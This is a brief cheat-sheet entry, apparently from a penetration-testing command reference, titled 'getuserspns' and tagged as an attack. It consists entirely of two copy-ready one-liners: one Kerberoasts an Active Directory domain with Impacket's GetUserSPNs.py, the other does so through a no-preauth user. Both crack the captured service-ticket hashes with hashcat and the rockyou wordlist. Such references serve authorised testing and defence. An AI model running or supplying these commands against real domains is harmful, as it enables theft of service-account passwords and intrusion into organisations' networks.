# getuserspns
#plateform/linux #target/remote #cat/ATTACK

## Kerberoast
```
GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/<user>:<passwd>; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## Kerberoast with no-preauth user
```
GetUserSPNs.py -request -no-preauth <no-preauth_user> -usersfile <usersfile|users.txt> -outputfile hashes.kerberoast <domain>/; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```
